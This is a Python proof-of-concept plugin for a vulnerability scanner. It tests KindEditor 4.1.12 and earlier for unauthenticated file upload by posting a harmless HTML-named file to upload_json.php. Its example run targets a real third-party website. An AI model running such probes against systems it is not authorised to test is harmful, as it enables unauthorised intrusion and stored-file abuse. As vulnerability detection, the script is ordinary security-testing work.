#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

"""
kindeditor <= 4.1.12
https://github.com/kindsoft/kindeditor/issues/249
"""

import json

def info(data):
    info = {
        "name": "kindeditor_upload_json",
        "info": "kindeditor_upload_json.",
        "level": "medium",
        "type": "info",
    }
    return info

def prove(data):
    init(data, 'kindeditor')
    if data['base_url']:
        try:
            url = data['base_url'] + "kindeditor/php/upload_json.php?dir=file"
            files = {"imgFile": ('mytestforyou.html', "this is a test for you. ", "text/plain")}
            res = json.loads(curl('post',url, files=files))
            if 'url'in res.keys() and 'kindeditor' in res['url']:
                data['flag'] = 1
                data['data'].append({"url": url})
                data['res'].append({"info": url, "key": url})
        except:
            pass
    return data


if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))